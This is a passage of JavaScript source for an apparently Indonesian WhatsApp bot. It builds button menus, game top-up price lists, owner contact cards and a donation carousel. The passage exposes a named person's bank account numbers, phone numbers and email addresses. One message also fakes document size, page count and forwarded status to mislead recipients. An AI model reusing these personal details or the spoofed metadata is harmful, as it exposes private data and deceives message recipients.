                "body": `< / > Group Menu`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": my.gh
            }
        }
    }, {
        quoted: repPy
    })
}
    break
  
    // Pastikan hanya menambahkan event listener di awal program, bukan dalam case
process.setMaxListeners(100000); // Tingkatkan batas listener jika diperlukan

case 'beton': {
     
    // Emoji yang akan digunakan
const loadingTexts = ["█▒▒▒▒▒▒▒▒▒▒▒ 10%", "████▒▒▒▒▒▒▒▒ 30%", "███████▒▒▒▒▒ 50%", "██████████▒▒ 80%", "████████████ 100%", "> Done! Sabar agak delay soalnya pake termux wkwk"];
let sentMessage;

try {
    // Kirim pesan awal
    sentMessage = await sych.sendMessage(m.chat, { text: loadingTexts[0] },
    { 
						quoted: fkontak 
					});
    

    // Edit pesan dengan mengganti teks
    for (let i = 1; i < loadingTexts.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
        await sych.sendMessage(m.chat, {
            edit: sentMessage.key, // Kunci pesan yang ingin diedit
            text: loadingTexts[i] // Teks baru
        });
    }
} catch (error) {
    console.error("Error saat mengedit pesan:", error);
}
    // Pesan teks untuk menu
    let hehe = `> Silahkan Pilih Button Menu di Bawah Ini,`;

// Mengirim pesan dengan gambar dan tombol
   


    // Siapkan konten pesan interaktif
    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: hehe,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname,
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...(await prepareWAMessageMedia(
                                { video: videoMenu },
                                { upload: sych.waUploadToServer }
                            )),
                            title: '',
                            subtitle: '',
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
    {
        name: "single_select",
        buttonParamsJson: `{
            "title": "Button Menu ⎙",
            "sections": [
                {
                    "title": "Select Menu",
                    "highlight_label": "Rekomendasi",
                    "rows": [
                        {
                            "title": "All Menu",
                            "id": "${prefix}allmenu",
                            "description": "Menampilkan semua fitur yang tersedia.",
                     
                            "selectmenu": "Pilih untuk semua fitur"
                        }
                    ]
                },
                {
                    "title": "Download Menu",
                    "highlight_label": "Rekomendasi",                   
                    "rows": [
                        {
                            "title": "Download Menu",
                            "id": "${prefix}downloadmenu",
                            "description": "Berbagai fitur untuk mengunduh konten.",
                      
                            "selectmenu": "Pilih untuk unduh"
                        }
                    ]
                },
                {
                    "title": "Owner Menu",
                    "rows": [
                        {
                            "title": "Owner Menu",
                            "id": "${prefix}ownermenu",
                            "description": "Fitur khusus untuk owner.",
                           
                            "selectmenu": "Pilih untuk owner"
                        }
                    ]
                },
                {
                    "title": "Group Menu",
                    "rows": [
                        {
                            "title": "Group Menu",
                            "id": "${prefix}groupmenu",
                            "description": "Fitur khusus untuk grup.",

                            "selectmenu": "Pilih untuk grup"
                        }
                    ]
                },
                {
                    "title": "Fun Menu",
                    "rows": [
                        {
                            "title": "Fun Menu",
                            "id": "${prefix}funmenu",
                            "description": "Fitur hiburan dan kesenangan.",

                            "selectmenu": "Pilih untuk hiburan"
                        }
                    ]
                },
                {
                    "title": "Game Menu",
                    "rows": [
                        {
                            "title": "Game Menu",
                            "id": "${prefix}gamemenu",
                            "description": "Kumpulan fitur permainan.",
                       
                            "selectmenu": "Pilih untuk game"
                        }
                    ]
                },
                {
                    "title": "Ai Menu",
                    "rows": [
                        {
                            "title": "Ai Menu",
                            "id": "${prefix}aimenu",
                            "description": "Fitur berbasis AI.",

                            "selectmenu": "Pilih untuk AI"
                        }
                    ]
                },
                {
                    "title": "Tools Menu",
                    "rows": [
                        {
                            "title": "Tools Menu",
                            "id": "${prefix}toolsmenu",
                            "description": "Berbagai alat pendukung.",

                            "selectmenu": "Pilih untuk alat"
                        }
                    ]
                }
            ]
        }`
    },
    


{
    name: "cta_url",
    buttonParamsJson: `{
        "display_text": "༗King Profile༗",
        "url": "https://api.whatsapp.com/send?phone=6288274119688",
        "merchant_url": "https://www.google.com"
    }`,
},
{
    name: "quick_reply",
    buttonParamsJson: `{
        "display_text": "Profile",
        "id": "${prefix}profile"
    }`,
},
{
    name: "quick_reply",
    buttonParamsJson: `  {
            "display_text": "Ping Bot",
            "id": "${prefix}ping"
        
        }`,
},
{
    name: "quick_reply",
    buttonParamsJson: `  {
            "display_text": "Link Group",
            "id": "${prefix}linkgroup"
        
        }`,
},

],
// Contoh




                        }),
                        
                       
    viewOnce: true,
                        contextInfo: {
                            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: my.ch,
                                newsletterName: `${botname}${randomEmoji}`,
                                serverMessageId: null,
                            },
                        },
                    }),
                },
            },
        },
        { quoted: fkontak }
    );
// Log untuk mengecek struktur pesan sebelum dikirim
console.log("Pesan yang akan dikirim:", JSON.stringify(msg, null, 2));
    // Kirim pesan
    await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });




// Mengirim stiker
await sych.sendMessage(m.chat, {
    sticker: {
        url: 'src/media/stc.webp'
    }, // Path file stiker
    mimetype: 'image/webp',
    
},

 {
    quoted: floc
});

    // Debug untuk melihat listener aktif
    console.log(process.listeners('unhandledRejection'));
}

break

//topup
case 'topup': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: Styles('Silahkan pilih *option* di bawah ini')
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: '©Langz'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: 'galang',
                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
 }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Pubg","id":"${prefix}pubg"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Free Fire","id":"${prefix}ff"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Mobile Legend","id":"${prefix}ml"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                              newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
                              newsletterJid:'120363373320014871@newsletter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break

case 'v1': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `${n}Viral Indo 1${n}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `> Titile :\n\nG4k ku4t d1 hut4n d1 g45`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: 'galang',
                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/1.mp4" } }, { upload: sych.waUploadToServer }))
 }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                              newsletterName: 'Powered By Galangxyz', 
                              newsletterJid:'120363373320014871@newsletter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: memek });

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break


//ml
case 'mml': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '36 Diamond',
description: `11K`, 
id: `.pembayarandm`
},
{
title: '44 Diamond',
description: "12k", 
id: `.pembayarandm`
},
{
title: '56 Diamond', 
description: "16k", 
id: `.pembayarandm`
},
{
title: '86 Diamond', 
description: "23K", 
id: `.pembayarandm`
},
{
title: '112 Diamond', 
description: "31K", 
id: `.pembayarandm`
},
{
title: '429 Diamond', 
description: "109K", 
id: `.pembayarandm`
},
{
title: '600 Diamond', 
description: "162K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'Select Option', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363373320014871@newsletter',
 newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ml Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `©Langz`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await sych.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
//ff
case 'ff': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 Diamond',
description: `10K`, 
id: `.pembayarandm`
},
{
title: '100 Diamond',
description: "15k", 
id: `.pembayarandm`
},
{
title: '140 Diamond', 
description: "20k", 
id: `.pembayarandm`
},
{
title: '210 Diamond', 
description: "30k", 
id: `.pembayarandm`
},
{
title: '355 Diamond', 
description: "47K", 
id: `.pembayarandm`
},
{
title: '1000 Diamond', 
description: "131K", 
id: `.pembayarandm`
},
{
title: '1450 Diamons', 
description: "182K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'Select Option', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363373320014871@newsletter',
 newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ff Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `©Langz`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await sych.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
//pubg
case 'pubg': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 uc',
description: `21K`, 
id: `.pembayarandm`
},
{
title: '100 uc',
description: "27k", 
id: `.pembayarandm`
},
{
title: '125 uc', 
description: "33k", 
id: `.pembayarandm`
},
{
title: '200 uc', 
description: "47K", 
id: `.pembayarandm`
},
{
title: '300 uc', 
description: "67K", 
id: `.pembayarandm`
},
{
title: '500 uc', 
description: "102K", 
id: `.pembayarandm`
},
{
title: '750 uc', 
description: "154K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'Select Option', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363373320014871@newsletter',
 newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup pubgl Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `©Langz`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/fbqpiy.jpeg" } }, { upload: sych.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await sych.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
//pembayaran
case 'pembayarandm': {
sycreply(`Jika Sudah Transfer Silahkan Tekan Tombol Owner Di Bawah Dan Ketik Id Sesuai Game di private chat owner Contoh : 
FF : 12344××××
ML : 12355×××× ( 2828282 )
PUBG : 282828×××`)
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: '©Langz'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: `${owname}`,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Qris","id":"${prefix}qris"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: 'Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦',
                            newsletterJid: '120363373320014871@newslatter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break








case 'tobrut': {
     
    // Emoji yang akan digunakan
    const loadingTexts = [
        "Loading.",
        "Loading..",
        "Loading...",
        "> Succesful !"
    ];
    let sentMessage;

    try {
        // Kirim pesan awal
        sentMessage = await sych.sendMessage(
            m.chat,
            { text: loadingTexts[0] },
            { quoted: fkontak }
        );

        // Edit pesan dengan mengganti teks
        for (let i = 1; i < loadingTexts.length; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
            await sych.sendMessage(m.chat, {
                edit: sentMessage.key, // Kunci pesan yang ingin diedit
                text: loadingTexts[i] // Teks baru
            });
        }
    } catch (error) {
        console.error("Error saat mengedit pesan:", error);
    }

    // Pesan teks untuk menu
    let hehe = `> PushContact | GetContact | Save Contact`;

    // Siapkan konten pesan interaktif
    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: hehe
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...(await prepareWAMessageMedia(
                                { video: videoMenu },
                                { upload: sych.waUploadToServer }
                            )),
                            title: '',
                            subtitle: '',
                            hasMediaAttachment: false
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "༗King Profile༗",
                                        url: "https://api.whatsapp.com/send?phone=6288274119688",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Get Contact",
                                        id: `${prefix}getcontact`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Save Contact",
                                        id: `${prefix}svcontact`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Push Contact",
                                        id: `${prefix}pushcontact`
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: my.ch,
                                newsletterName: `${botname}${randomEmoji}`,
                                serverMessageId: null
                            }
                        }
                    })
                }
            }
        },
        { quoted: fkontak }
    );

    // Kirim pesan
    await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
    
    

    // Debug untuk melihat listener aktif
    console.log(process.listeners('unhandledRejection'));
}
break;


case 'donasi': {
     

try {
    const carouselCards = [
        {
            header: {
                title: "> Dana",
                hasMediaAttachment: true,
                imageMessage: (await generateWAMessageContent({
                    image: {
                        url: './src/media/dana.jpg'
                    }
                }, {
                    upload: sych.waUploadToServer
                })).imageMessage
            },
            body: {
                text: `> A/N *M Galang Febriansyah Pratama*`
            },
            footer: {
                text: "6282280993065"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Salin",
                            copy_code: "082280993065"
                        })
                    },
                   
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Call",
                            phone_number: "+6288274119688" // Ganti dengan nomor telepon yang sesuai
                        })
                    }
                ]
            }
        },
        {
            header: {
                title: "> Cimb Niaga",
                hasMediaAttachment: true,
                imageMessage: (await generateWAMessageContent({
                    image: {
                        url: './src/media/cimb.jpg'
                    }
                }, {
                    upload: sych.waUploadToServer
                })).imageMessage
            },
            body: {
                text: `> A/N *M Galang Febriansyah Pratama*`
            },
            footer: {
                text: "763802276000"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Salin",
                            copy_code: "763802276000"
                        })
                    },
                   
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Call",
                            phone_number: "+6288274119688" // Ganti dengan nomor telepon yang sesuai
                            })
                        }
                ]
            }
        },
        {
            header: {
                title: "> BANK RAKYAT INDONESIA",
                hasMediaAttachment: true,
                imageMessage: (await generateWAMessageContent({
                    image: {
                        url: './src/media/bri.jpg'
                    }
                }, {
                    upload: sych.waUploadToServer
                })).imageMessage
            },
            body: {
                text: `> A/N *M Galang Febriansyah Pratama*`
            },
            footer: {
                text: "574701011764505"
            },
            nativeFlowMessage: {
                buttons: [
                   
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Salin",
                            copy_code: "574701011764505"
                        })
                    },
                   
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "Call",
                            phone_number: "+6288274119688" // Ganti dengan nomor telepon yang sesuai
                        })
                    }
                ]
            }
        }
    ];

    // Generate carousel message
    const carouselMessage = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: {
                        text: ""
                    },
                    footer: {
                        text: "Sych Bot x Langz"
                    },
                    header: {
                        hasMediaAttachment: false
                    },
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: carouselCards
                    })
                })
            }
        }
    }, { //quoted
    });
    // Kirim pesan carousel
    await sych.relayMessage(m.chat, carouselMessage.message, {
        messageId: carouselMessage.key.id
    });


} catch (error) {
    console.error("Kesalahan saat mengirim carousel:", error);
    await sych.sendMessage(m.chat, {
        text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
    }, {
        quoted: m
    });
}
break;
}

// Fungsi untuk mendekode polling yang dipilih
const decodeVote = (vote) => {
    // Debug: Melihat nilai encPayload dalam Base64
    const encodedPayloadBase64 = Buffer.from(vote.encPayload).toString('base64');
    console.log("Base64 Encoded Payload:", encodedPayloadBase64);  // Debug

    // Melakukan decode menjadi string UTF-8
    const decodedPayload = Buffer.from(vote.encPayload).toString('utf8');
    console.log("Decoded Payload:", decodedPayload);  // Debug

    return decodedPayload; // Kembalikan hasil decode
};

// Handler untuk event polling update
case 'pollupdate': {
    if (m.message.pollUpdateMessage) {
        const pollUpdate = m.message.pollUpdateMessage;

        // Debug: Menampilkan seluruh polling update
        console.log("Poll Update:", pollUpdate);

        // Ambil nilai encPayload dan lakukan decoding
        const selectedOption = decodeVote(pollUpdate.vote); // Dekode pilihan polling
        console.log("Decoded Option:", selectedOption);  // Debug: Melihat hasil decode

        // Jalankan aksi berdasarkan opsi polling yang dipilih
        switch (selectedOption.toLowerCase()) {
            case 'm1':
                let allMenu = `┌──⭓ *All Menu*\n│\n${
                    allCmd.sort((a, b) => a.localeCompare(b))
                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
                }\n│\n└───────⭓`;
                sych.reply(m.chat, allMenu);
                break;

            case 'menugroup':
                let groupMenu = `┌──⭓ *Group Menu*\n│\n${
                    cmdGrup.sort((a, b) => a.localeCompare(b))
                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
                }\n│\n└───────⭓`;
                sych.reply(m.chat, groupMenu);
                break;

            case 'menudownload':
                let downloadMenu = `┌──⭓ *Downloader Menu*\n│\n${
                    cmdDown.sort((a, b) => a.localeCompare(b))
                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
                }\n│\n└───────⭓`;
                sych.reply(m.chat, downloadMenu);
                break;

            case 'menusearch':
                let searchMenu = `┌──⭓ *Search Menu*\n│\n${
                    cmdSearch.sort((a, b) => a.localeCompare(b))
                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
                }\n│\n└───────⭓`;
                sych.reply(m.chat, searchMenu);
                break;

            case 'menuowner':
                let ownerMenu = `┌──⭓ *Owner Menu*\n│\n${
                    cmdOwner.sort((a, b) => a.localeCompare(b))
                        .map((v) => `│⭔ ${prefix}${v}`).join('\n')
                }\n│\n└───────⭓`;
                sych.reply(m.chat, ownerMenu);
                break;

            // Tambahkan case lain sesuai kebutuhan...

            default:
                sych.reply(m.chat, 'Pilihan tidak valid.');
                break;
        }
    }
    break;
}




case 'pepek': {
    // Hapus pesan sebelumnya jika ada
    if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }

    // Data kontak owner
    let ownerContacts = [
        {
            name: "Langz",
            phone: "50251731838", // Nomor telepon tanpa + atau 0 di awal
            email: "wibukntl858@gmail.com", // Email owner
            region: "Indonesia", // Region atau lokasi
            website: "https://profile.galng.my.id/", // Website owner
            description: "Admin Utama"
        },
        {
            name: "Langz 2",
            phone: "17089003182",
            email: "fplang89@gmail.com",
            region: "USA",
            website: "https://code.mataberita.com",
            description: "Admin Cadangan"
        }
    ];

    // Gabungkan semua vCard menjadi satu pesan
    let vCards = ownerContacts.map(contact => 
        `BEGIN:VCARD\nVERSION:3.0\nFN:${contact.name}\nTEL;type=CELL;type=VOICE;waid=${contact.phone}:${contact.phone}\nEMAIL;type=INTERNET:${contact.email}\nADR;type=WORK:;;${contact.region};;;;\nURL:${contact.website}\nNOTE:${contact.description}\nEND:VCARD`
    ).join('\n');

    // Kirim pesan dengan semua kontak
    let sentMsg = await sych.sendMessage(m.chat, {
        contacts: {
            displayName: 'Kontak Owner',
            contacts: ownerContacts.map(contact => ({
                displayName: contact.name,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${contact.name}\nTEL;type=CELL;type=VOICE;waid=${contact.phone}:${contact.phone}\nEMAIL;type=INTERNET:${contact.email}\nADR;type=WORK:;;${contact.region};;;;\nURL:${contact.website}\nNOTE:${contact.description}\nEND:VCARD`
            }))
        }
    }, { quoted: fkontak }); // Opsi mengutip pesan sebelumnya (opsional)

    // Simpan ID pesan terkirim untuk penghapusan otomatis pesan berikutnya
    global.lastMessageId = sentMsg.key.id; // Simpan ID pesan yang baru saja dikirim
    break;
}







//donate

case 'kontol': {
let profile;
				try {
					profile = await sych.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim;
				}

    let menu = `*_👋🏻 *Hello! I am Langz Bot Version 9999.*  
Ready products like nokos, and many more! Designed with precision and care, I ensure your experience is seamless and efficient.  

╭───❐ *I N F O R M A S I* ❐───✧  
├ 📜 *Bot Name* : Langz 
├ 👨‍💻 *Owner* : Galang  
├ 🌐 *Version* : 9999  
├ 🛒 *Product* : Nokos  
╰─────────────────────✧  

💡 *Feel free to explore all my features using the menu provided!*  
🔰 Powered by Galangz _*`;

    // Tombol utama
    let buttons = [
        { buttonId: ".bot mode self", buttonText: { displayText: " Self " }, type: 1 },
        { buttonId: ".bot mode public", buttonText: { displayText: " Public " }, type: 1 }
        
    ];

    // Pesan dengan media video
    let buttonMessage = {
    document: fake.docs,
        fileName: ucapanWaktu,
        mimetype: pickRandom(fake.listfakedocs),
        fileLength: '100000000000000',
        pageCount: '999',        image: {
            url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg", // Pastikan file ini tersedia
            gifPlayback: true
        },
        caption: `${menu}`, // Teks menu
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: "Bot Status",
                body: "🟢 Active",
                thumbnailUrl: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg",
                mediaType: 1,
                renderLargerThumbnail: true,
                previewType: 0,
             
                mediaUrl: my.gh,
                sourceUrl: my.gh
            }
        },
        footer: "© Langz",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

    // Tambahan flow actions
    // Bagian Sections
let sections = [
    {
        title: 'Select Menu',
        highlight_label: 'Powered by Galangz',
        rows: [
            {
                title: `${prefix}Allmenu`,
                description: `Daftar semua menu yang tersedia.`,
                id: `${prefix}allmenu`
            },
            {
                title: `${prefix}Downloadmenu`,
                description: `Menu untuk mendownload media.`,
                id: `${prefix}downloadmenu`
            },
            {
                title: `${prefix}Ownermenu`,
                description: `Menu khusus untuk owner.`,
                id: `${prefix}ownermenu`
            },
            {
                title: `${prefix}Groupmenu`,
                description: `Menu untuk pengelolaan grup.`,
                id: `${prefix}groupmenu`
            },
            {
                title: `${prefix}Funmenu`,
                description: `Menu hiburan dengan berbagai fitur.`,
                id: `${prefix}funmenu`
            },
            {
                title: `${prefix}Gamemenu`,
                description: `Menu untuk bermain game.`,
                id: `${prefix}gamemenu`
            },
            {
                title: `${prefix}Aimenu`,
                description: `Menu AI dan fitur kecerdasan buatan.`,
                id: `${prefix}aimenu`
            },
            {
                title: `${prefix}Toolsmenu`,
                description: `Menu berisi berbagai tools.`,
                id: `${prefix}toolsmenu`
            }
        ]
    }
];

// Membuat List Message
let listMessage = {
    title: 'Select Menu',
    sections
};

// Output ke Flow Actions
const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'Pilih Menu' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
